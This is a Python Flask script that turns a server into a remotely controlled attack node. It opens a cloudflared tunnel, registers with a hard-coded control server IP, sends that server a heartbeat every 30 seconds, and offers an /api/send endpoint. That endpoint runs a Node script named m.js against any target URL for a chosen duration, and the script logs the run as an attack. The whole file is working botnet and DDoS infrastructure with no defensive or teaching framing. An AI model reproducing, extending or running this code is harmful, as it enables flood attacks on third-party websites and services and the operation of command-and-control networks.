#!/usr/bin/env python3
from flask import Flask, request, jsonify
import subprocess
import threading
import time
import re
import requests
import sys

app = Flask(__name__)
CONTROL_SERVER = "http://45.137.70.38:5001"

class VPSTunnel:
    def __init__(self):
        self.tunnel_url = None
        self.tunnel_process = None
        self.vps_id = f"vps_{int(time.time())}"
        self.registered = False
        self.registration_attempts = 0
    
    def start_tunnel(self, port=5000):
        """Start cloudflared tunnel with auto-register and retry"""
        def run_tunnel():
            try:
                print("[INFO] Starting cloudflared tunnel...")
                self.tunnel_process = subprocess.Popen(
                    f'cloudflared tunnel --url http://localhost:{port}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                
                print("[INFO] Waiting for tunnel URL...")
                for line in iter(self.tunnel_process.stdout.readline, ''):
                    print(f"[CLOUDFLARED] {line.strip()}")
                    if 'trycloudflare.com' in line and 'https://' in line:
                        urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                        if urls:
                            self.tunnel_url = urls[0]
                            print(f"[SUCCESS] API URL: {self.tunnel_url}")
                            
                            # REGISTER WITH RETRY
                            if self.register_with_control_retry():
                                print("[SUCCESS] Registration successful, starting heartbeat...")
                                self.start_heartbeat()
                            else:
                                print("[ERROR] Registration failed after retries")
                            break
            except Exception as e:
                print(f"[ERROR] Tunnel error: {e}")
        
        thread = threading.Thread(target=run_tunnel)
        thread.daemon = True
        thread.start()
    
    def register_with_control_retry(self, max_attempts=5):
        """Register with retry logic"""
        for attempt in range(max_attempts):
            try:
                print(f"[INFO] Registration attempt {attempt + 1}/{max_attempts}...")
                response = requests.post(
                    f"{CONTROL_SERVER}/register",
                    json={
                        'vps_url': self.tunnel_url,
                        'vps_id': self.vps_id
                    },
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"[SUCCESS] Registered with control server: {self.tunnel_url}")
                    self.registered = True
                    return True
                else:
                    print(f"[ERROR] Registration failed (attempt {attempt + 1}): {response.text}")
                    
            except Exception as e:
                print(f"[ERROR] Registration error (attempt {attempt + 1}): {e}")
            
            if attempt < max_attempts - 1:
                wait_time = (attempt + 1) * 10  # 10, 20, 30, 40 seconds
                print(f"[INFO] Waiting {wait_time}s before retry...")
                time.sleep(wait_time)
        
        return False
    
    def start_heartbeat(self):
        """Send periodic heartbeat to control server"""
        def heartbeat_loop():
            while True:
                if self.tunnel_url:
                    try:
                        response = requests.post(
                            f"{CONTROL_SERVER}/heartbeat",
                            json={'vps_url': self.tunnel_url},
                            timeout=5
                        )
                        if response.status_code == 200:
                            print(f"[HEARTBEAT] Sent: {self.tunnel_url}")
                        else:
                            print(f"[ERROR] Heartbeat failed: {response.text}")
                    except Exception as e:
                        print(f"[ERROR] Heartbeat error: {e}")
                
                time.sleep(30)  # Send heartbeat every 30 seconds
        
        thread = threading.Thread(target=heartbeat_loop)
        thread.daemon = True
        thread.start()

vps_tunnel = VPSTunnel()

def run_mjs_async(target, duration):
    """Run m.js in background"""
    def runner():
        try:
            print(f"[ATTACK] Starting: {target} for {duration}s")
            result = subprocess.run(
                ['node', 'm.js', target, str(duration), '4', 'h1'],
                capture_output=True,
                text=True,
                timeout=duration + 10
            )
            if result.returncode == 0:
                print(f"[SUCCESS] m.js completed: {target}")
            else:
                print(f"[WARNING] m.js finished with errors: {result.stderr}")
        except Exception as e:
            print(f"[ERROR] m.js failed: {e}")
    
    thread = threading.Thread(target=runner)
    thread.daemon = True
    thread.start()

@app.route('/api/send', methods=['GET'])
def api_send():
    """API: /api/send?target=URL&time=SECONDS"""
    print(f"[API] Received call: target={request.args.get('target')}, time={request.args.get('time')}")
    
    target = request.args.get('target')
    time_param = request.args.get('time', '60')
    
    if not target:
        return jsonify({'error': 'Missing target parameter'}), 400
    
    try:
        duration = int(time_param)
    except:
        return jsonify({'error': 'Time must be a number'}), 400
    
    run_mjs_async(target, duration)
    
    return jsonify({
        'success': True,
        'target': target,
        'time': duration,
        'vps_url': vps_tunnel.tunnel_url
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    print("[API] Status check received")
    return jsonify({
        'status': 'online', 
        'tunnel_url': vps_tunnel.tunnel_url,
        'registered': vps_tunnel.registered
    })

@app.route('/')
def home():
    return f"""
    <h1>VPS API Server</h1>
    <p>Status: <strong>{"Online" if vps_tunnel.tunnel_url else "Offline"}</strong></p>
    <p>Tunnel URL: <code>{vps_tunnel.tunnel_url or "Not available"}</code></p>
    <p>Registered: <strong>{"Yes" if vps_tunnel.registered else "No"}</strong></p>
    <p>Usage: <code>/api/send?target=URL&time=SECONDS</code></p>
    """

if __name__ == '__main__':
    print("[INFO] Starting VPS API Server...")
    print(f"[INFO] Control Server: {CONTROL_SERVER}")
    
    vps_tunnel.start_tunnel()
    
    print("[INFO] VPS API Server Started - Auto-Register with Retry Enabled")
    app.run(host='0.0.0.0', port=5000, debug=False)
